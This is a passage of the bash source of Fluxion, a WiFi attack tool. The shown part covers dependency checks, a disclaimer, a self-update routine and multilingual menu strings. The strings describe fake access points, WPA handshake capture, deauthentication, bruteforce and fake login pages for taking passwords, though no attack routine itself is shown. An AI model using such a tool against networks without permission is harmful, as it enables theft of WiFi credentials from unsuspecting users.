	sleep 0.025

	echo -ne "xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "openssl........."
	if ! hash openssl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "rfkill.........."
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "strings........."
        if ! hash strings 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "fuser..........."
        if ! hash fuser 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (psmisc)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025



	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 1
	clear
}
top
checkdependences

# Create working directory
if [ ! -d $DUMP_PATH ]; then
	mkdir -p $DUMP_PATH &>$flux_output_device
fi

# Create handshake directory
if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$flux_output_device
fi

#create password log directory
if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$flux_output_device
fi



if [ $FLUX_DEBUG != 1 ]; then
	whiptail --title "Fluxion Disclaimer" --msgbox "Fluxion is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own or have permission to test. Any other use is not the responsibility of the developer(s).  Be sure that you understand and are complying with the Fluxion licenses and laws in your area.  In other words, don't be stupid, don't be an asshole and use this tool responsibly and legally." 14 60
	clear; echo ""
		   sleep 0.01 && echo -e "$red "
           sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
           sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
           sleep 0.01 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
           sleep 0.01 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
           sleep 0.01 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
           sleep 0.01 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "

	echo""

	sleep 0.1
	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
	sleep 0.1
	echo -e $green "           Page:"$red" https://github.com/deltaxflux/fluxion "$transparent
	sleep 0.1
	echo -n "                              Latest rev."
	tput civis
	checkupdatess &
	spinner "$!"
	revision_online=$(cat $DUMP_PATH/Irev)
	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
		if [ "$revision_online" != "?" ]; then

			if [ "$revision" -lt "$revision_online" ]; then
				echo
				echo
				echo -ne $red"            New revision found! "$yellow
                echo -ne "Update? [Y/n]: "$transparent
				read -N1 doupdate
				echo -ne "$transparent"
                doupdate=${doupdate:-"Y"}
				if [ "$doupdate" = "Y" ]; then
					cp $0 $HOME/flux_rev-$revision.backup
					curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0
					echo
					echo
					echo -e ""$red"
	Updated successfully! Restarting the script to apply the changes ..."$transparent""
					sleep 3
					chmod +x $0
					exec $0
                    exit
				fi
			fi
		fi
	echo ""
	tput cnorm
	sleep 1

fi

# Show info for the selected AP
function infoap {

	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
	echo "INFO WIFI"
	echo
	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
	echo -e "               "$blue"Channel"$transparent" = $channel"
	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
	echo
}

############################################## < START > ##############################################






############################################### < MENU > ###############################################

# Windows + Resolution
function setresolution {

	function resA {

		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}

	function resB {

		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {

		TOPLEFT="-geometry 100x20+0+0"
		TOPRIGHT="-geometry 109x20-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		TOPLEFTBIG="-geometry  100x70+0+0"
		TOPRIGHTBIG="-geometry 90x27-0+0"
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;;
esac

language
}

function language {

    iptables-save > $DUMP_PATH/iptables-rules
	conditional_clear

if [ "$FLUX_AUTO" =  "1" ];then 
	german; setinterface

else 

	while true; do
		conditional_clear
		top

		echo -e ""$red"["$yellow"i"$red"]"$transparent" Select your language"
		echo "                                       "
		echo -e "      "$red"["$yellow"1"$red"]"$transparent" English          "
		echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Romanian     "
		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Turkish    "
		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Spanish    "
		echo -e "      "$red"["$yellow"6"$red"]"$transparent" Chinese   "
		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
        echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "        
		echo "                                       "
		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
		read yn
		echo ""
		case $yn in
			1 ) english; setinterface; break ;;
			2 ) german; setinterface; break ;;
			3 ) romanian; setinterface; break;;
			4 ) turkish; setinterface; break;;
			5 ) spanish; setinterface; break;;
			6 ) chinese; setinterface; break;;
			7 ) italian; setinterface; break;;
			8 ) czech; setinterface; break;;
			9 ) greek; setinterface; break;;
            10 ) french; setinterface; break;;
			skip ) english; skipme; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
fi 

}

function german {
	header_setinterface="Wähle deine Netzwerkkarte aus"
	setinterface_error="Es wurden keine Netzwerkkarten gefunden, beende..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Wähle deinen Kanal aus"

	choosescan_option_1="Alle Kanäle"
	choosescan_option_2="Spezifische Kanal(e)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Einzelner Kanal"
	scanchan_option_2="Mehrere Kanäle"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scanne Netzwerke..."
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Wähle deine Angriffsmethode aus"
	askAP_option_1="FakeAP - Hostapd ("$red"Empfohlen)"
	askAP_option_2="FakeAP - airbase-ng (Langsame Verbindung)"
	askAP_option_4="Bruteforce - (Handshake wird benötigt)"
	general_back="Zurück"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="Methode zum Prüfen des Handshake"
	askauth_option_1="Handshake ("$red"Empfohlen)"
	askauth_option_2="Wpa_supplicant (Mehrere Ausfälle)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake-Überprüfung"
	deauthforce_option_1="aircrack-ng (Ausfall möglich)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Erfassung des Handshake*"
	deauthMENU_option_1="Überprüfe Handshake"
	deauthMENU_option_2="Starte neu"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Wähle deine Strategie aus"
	header_ConnectionRESET="Wähle deine Anmeldeseite aus"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_case_error="Unbekannte Option, wähle neu aus"
	general_error_1="Nicht gefunden"
	general_error_2="Datei wurde ${red}nicht$transparent gefunden"
	general_back="Zurück"
	general_exitmode="Aufräumen und schließen"
	general_exitmode_1="Deaktivierung des Monitor Interface"
	general_exitmode_2="Deaktivierung des Interface"
	general_exitmode_3="Deaktivierung "$grey"von weiterleiten von Paketen"
	general_exitmode_4="Säubere "$grey"iptables"
	general_exitmode_5="Wiederherstellung von"$grey"tput"
	general_exitmode_6="Neustarten des "$grey"Netzwerk Manager"
	general_exitmode_7="Wiederherstellung war erfolgreich"
	general_exitmode_8="Vielen Dank für die Nutzung von Fluxion"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Mit aktive Nutzer"
	selection_2="Wähle dein Angriffsziel aus. Um neu zu scannen tippe $red r$transparent"

}

function french {
    header_setinterface="Sélectionnez une interface"
    setinterface_error="Pas de carte wifi detecté, fin..."

    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_choosescan="Sélectionnez un canal"
    choosescan_option_1="Tous les canaux "
    choosescan_option_2="Canal spécifique"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    scanchan_option_1="Un seul canal"
    scanchan_option_2="Plusieurs canaux"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_scan="WIFI Monitor"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_scanchan="Scan du reseau"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_askAP="Sélectionnez une option d'attaque"
    askAP_option_1="FakeAP - Hostapd ("$red"Recommandé)"
    askAP_option_2="FakeAP - airbase-ng (Connexion plus lente)"
    askAP_option_4="Bruteforce - (Handshake requis)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_askauth="METHODE DE VÉRIFICATION DU PASSWORD"
    askauth_option_1="Handshake ("$red"Recommandé)"
    askauth_option_2="Wpa_supplicant (Plus d'échecs)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_deauthforce="Vérification du Handshake"
    deauthforce_option_1="aircrack-ng (Moins de chance)"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_deauthMENU="*Capture du Handshake*"
    deauthMENU_option_1="Vérification du Handshake"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    header_webinterface="Sélectionnez votre option"
    header_ConnectionRESET="Sélectionnez la page de connexion"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    general_back="Retour"
    general_error_1="Pas trouvé"
    general_case_error="Option inconnue. Sélectionnez à nouveau"
    general_exitmode="Nettoyage et fermeture"
    general_exitmode_1="Désactivation de l'interface de monitoring"
    general_exitmode_2="Désactivation de l'interface"
    general_exitmode_3="Désactivation de "$grey" transmission de paquets"
    general_exitmode_4="Nettoyage "$grey"iptables"
    general_exitmode_5="Restauration "$grey"tput"
    general_exitmode_6="Redémarrage "$grey"Network-Manager"
    general_exitmode_7="Nettoyage effectué avec succès!"
    general_exitmode_8="Merci d'avoir utilisé fluxion"
    # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    selection_1="Clients actifs"
    selection_2="Sélectionnez une cible. Pour relancer un scan, touche $red r$transparent"
}

function english {
	header_setinterface="Select an interface"
	setinterface_error="There are no wireless cards, quit..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Select channel"
	choosescan_option_1="All channels "
	choosescan_option_2="Specific channel(s)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Single channel"
	scanchan_option_2="Multiple channels"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scanning Target"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Select Attack Option"
	askAP_option_1="FakeAP - Hostapd ("$red"Recommended)"
	askAP_option_2="FakeAP - airbase-ng (Slower connection)"
	askAP_option_4="Bruteforce - (Handshake is required)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="METHOD TO VERIFY THE PASSWORD"
	askauth_option_1="Handshake ("$red"Recommended)"
	askauth_option_2="Wpa_supplicant(More failures)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake check"
	deauthforce_option_1="aircrack-ng (Miss chance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Capture Handshake*"
	deauthMENU_option_1="Check handshake"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Select your option"
	header_ConnectionRESET="Select Login Page"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="Back"
	general_error_1="Not_Found"
	general_case_error="Unknown option. Choose again"
	general_exitmode="Cleaning and closing"
	general_exitmode_1="Disabling monitoring interface"
	general_exitmode_2="Disabling interface"
	general_exitmode_3="Disabling "$grey"forwarding of packets"
	general_exitmode_4="Cleaning "$grey"iptables"
	general_exitmode_5="Restoring "$grey"tput"
	general_exitmode_6="Restarting "$grey"Network-Manager"
	general_exitmode_7="Cleanup performed successfully!"
	general_exitmode_8="Thanks for using fluxion"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Active clients"
	selection_2="Select target. For rescan type$red r$transparent"
	}

function romanian {
    header_setinterface="Selecteaza o interfata"
    setinterface_error="Nu este nici o placa de retea wireless, iesire..."

    #
    header_choosescan="Selecteaza canalul"
    choosescan_option_1="Toate canalele "
    choosescan_option_2="Canal specific(s)"
    #
    scanchan_option_1="Un singur canal"
    scanchan_option_2="Canale multiple"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Scaneaza tinta"
    #
    header_askAP="Selecteaza optiunea de atac"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomandat)"
    askAP_option_2="FakeAP - airbase-ng (Conexiune mai lenta)"
    askAP_option_4="Bruteforce - (Handshake este necesara)"
    #
    header_askauth="METODA PENTRU VERIFICAREA PAROLEI"
    askauth_option_1="Handshake ("$red"Recomandat)"
    askauth_option_2="Wpa_supplicant(Mai multe eșecuri)"
    #
    header_deauthforce="Verificare Handshake"
    deauthforce_option_1="aircrack-ng (Sansa ratata)"
    #
    header_deauthMENU="*Capturare Handshake*"
    deauthMENU_option_1="Verificare handshake"
    #
    handshakelocation_1="Handshake locatie  (Examplu: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Apasa ${yellow}ENTER$transparent to skip"
    #
    header_webinterface="Selecteaza optiunea ta"
    header_ConnectionRESET="Selecteaza pagina de logare"
    #
    general_back="Inapoi"
    general_error_1="Nu a fost gasit"
    general_case_error="Optiune necunoscuta. Incearca din nou"
    general_exitmode="Curatire si inchidere"
    general_exitmode_1="Dezacticati interfata monitorizata"
    general_exitmode_2="Dezactivati interfata"
    general_exitmode_3="Dezactivati "$grey"forwarding of packets"
    general_exitmode_4="Curatire "$grey"iptables"
    general_exitmode_5="Restaurare "$grey"tput"
    general_exitmode_6="Restartare "$grey"Network-Manager"
    general_exitmode_7="Curatire efectuata cu succes!"
    general_exitmode_8="Multumesc pentru ca ati folosit fluxion"
    #
    selection_1="Clienti activi"
    selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"

}

function turkish {
	header_setinterface="Bir Ag Secin"
    setinterface_error="Wireless adaptorunuz yok, program kapatiliyor..."

    #
    header_choosescan="Kanal Sec"
    choosescan_option_1="Tum Kanallar "
    choosescan_option_2="Sectigim Kanal ya da Kanallar"
    #
    scanchan_option_1="Tek Kanal"
    scanchan_option_2="Coklu Kanal"
    #
    header_scan="Wifi Goruntule"
    #
    header_scanchan="Hedef Taraniyor"
    #
    header_askAP="Saldiri Tipi Secin"
    askAP_option_1="SahteAP - Hostapd ("$red"Tavsiye Edilen)"
    askAP_option_2="SahteAP - airbase-ng (Yavas Baglanti)"
    askAP_option_4="Kabakuvvet - (Handshake Gereklidir)"
    #
    header_askauth="Sifre Kontrol Metodu"
    askauth_option_1="Handshake ("$red"Tavsiye Edilen)"
    askauth_option_2="Wpa_supplicant(Hata Orani Yuksek)"
    #
    header_deauthforce="Handshake Kontrol"
    deauthforce_option_1="aircrack-ng (Hata Sansı Var)"
    #
    header_deauthMENU="*Kaydet Handshake*"
    deauthMENU_option_1="Kontrol Et handshake"
    #
    handshakelocation_1="handshake Dizini  (Ornek: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Tusa Bas ${yellow}ENTER$transparent Gecmek icin"
    #
    header_webinterface="Secenegi Sec"
    header_ConnectionRESET="Giris Sayfasini Sec"
    #
    general_back="Geri"
    general_error_1="Bulunamadi"
    general_case_error="Bilinmeyen Secenek. Tekrar Seciniz"
    general_exitmode="Temizleniyor ve Kapatiliyor"
    general_exitmode_1="Monitor modu kapatiliyor"
    general_exitmode_2="Ag Arayuzu kapatiliyor"
    general_exitmode_3="Kapatiliyor "$grey"forwarding of packets"
    general_exitmode_4="Temizleniyor "$grey"iptables"
    general_exitmode_5="Yenileniyor "$grey"tput"
    general_exitmode_6="Tekrar Baslatiliyor "$grey"Network-Manager"
    general_exitmode_7="Temizlik Basariyla Tamamlandi!"
    general_exitmode_8="Fluxion kullandiginiz icin tesekkurler."
    #
    selection_1="Aktif kullanicilar"
    selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"

}

function spanish {
	header_setinterface="Seleccione una interfase"
    setinterface_error="No hay tarjetas inalambricas, saliendo..."

    #
    header_choosescan="Seleccione canal"
    choosescan_option_1="Todos los canales "
    choosescan_option_2="Canal(es) específico(s)"
    #
    scanchan_option_1="Canal único"
    scanchan_option_2="Canales múltiples"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Escaneando objetivo"
    #
    header_askAP="Seleccione Opción de Ataque"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
    askAP_option_2="FakeAP - airbase-ng (Conexión más lenta)"
    askAP_option_4="Bruteforce - (Se requiere handshake)"
    #
    header_askauth="MÉTODO PARA VERIFICAR CONTRASEÑA"
    askauth_option_1="Handshake ("$red"Recomendado)"
    askauth_option_2="Wpa_supplicant(Más Fallas)"
    #
    header_deauthforce="Chequeo de Handshake"
    deauthforce_option_1="aircrack-ng (Posibilidad de error)"
    #
    header_deauthMENU="*Capturar Handshake*"
    deauthMENU_option_1="Chequear handshake"
    #
    handshakelocation_1="ubicación del handshake  (Ejemplo: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Presione ${yellow}ENTER$transparent para saltar"
    #
    header_webinterface="Seleccione su opción"
    header_ConnectionRESET="Seleccione página de Login"
    #
    general_back="Atrás"
    general_error_1="No_Encontrado"
    general_case_error="Opción desconocida. Elija de nuevo"
    general_exitmode="Limpiando y cerrando"
    general_exitmode_1="Deshabilitando interfaz de monitoreo"
    general_exitmode_2="Deshabilitando interfaz"
    general_exitmode_3="Deshabilitando "$grey"reenvio de paquetes"
    general_exitmode_4="Limpiando "$grey"iptables"
    general_exitmode_5="Restaurando "$grey"tput"
    general_exitmode_6="Reiniciando "$grey"Network-Manager"
    general_exitmode_7="Limpieza realizada satisfactoriamente!"
    general_exitmode_8="Gracias por usar fluxion"
    #
    selection_1="Clientes activos"
    selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"


}

function chinese {

	setinterface_error="没有检测到网卡 退出..."
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="选择信道"
	choosescan_option_1="所有信道 "
	choosescan_option_2="指定信道"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="单一信道"
	scanchan_option_2="多个信道"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="正在扫描目标"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="选择攻击选项"
	askAP_option_1="伪装AP - Hostapd ("$red"推荐)"
	askAP_option_4="暴力破解 - (需要握手包)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="请选择验证密码方式"
	askauth_option_2="提供的wpa (易错)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="握手包检查"
	deauthforce_option_1="aircrack-ng (Miss chance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*抓握手包*"
	deauthMENU_option_1="检查握手包"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="请选择"
	header_ConnectionRESET="选择登陆界面"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="返回"
	general_error_1="未找到"
	general_case_error="未知选项. 请再次选择"
	general_exitmode="清理并退出"
	general_exitmode_3="关闭 "$grey"forwarding of packets"
	general_exitmode_4="清理 "$grey"iptables"
	general_exitmode_5="恢复 "$grey"tput"
	general_exitmode_6="重启 "$grey"Network-Manager"
	general_exitmode_7="清理完成!"
	general_exitmode_8="感谢使用fluxion!"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="活动的客户端"
	selection_2="选择一个目标. 重扫 按$red r$transparent"

}

function italian {

    header_setinterface="Seleziona un'interfaccia"
    setinterface_error="Nessuna scheda di rete trovata, chiusura..."

    #
    header_choosescan="Selezione Canale"
    choosescan_option_1="Tutti i Canali"
    choosescan_option_2="Definisci Canale/i"
    #
    scanchan_option_1="Canale Singolo"
    scanchan_option_2="Canali Multipli"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Scansione dell'Obiettivo"
    #
    header_askAP="Seleziona Opzione d'Attacco"
    askAP_option_1="FakeAP - Hostapd ("$red"Consigliato!)"
    askAP_option_2="FakeAP - airbase-ng (Connessione Lenta)"
    askAP_option_4="Bruteforce - (Richiede handshake)"
    #
    header_askauth="MODALITA' DI VERIFICA DELLA PASSWORD"
    askauth_option_1="Handshake ("$red"Consigliato!)"
    askauth_option_2="Wpa_supplicant(Rischio di Insuccesso)"
    #
    header_deauthforce="Controllo dell'Handshake"
    deauthforce_option_1="aircrack-ng (Possibilità di Errori)"
    #
    header_deauthMENU="*Cattura dell'Handshake*"
    deauthMENU_option_1="Controllo handshake"
    #
    handshakelocation_1="posizione dell'handshake  (Esempio: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Premi ${yellow}INVIO$transparent per avanzare"
    #
    header_webinterface="Seleziona la tua scelta"
    header_ConnectionRESET="Seleziona la pagina di Login"
    #
    general_back="Indietro"
    general_error_1="Non_Trovato"
    general_case_error="Opzione Sconosciuta. Scegli di nuovo"
    general_exitmode="Pulizia e chiusura"
    general_exitmode_1="Disabilito l'Interfaccia Monitor"
    general_exitmode_2="Disabilito l'Interfaccia"
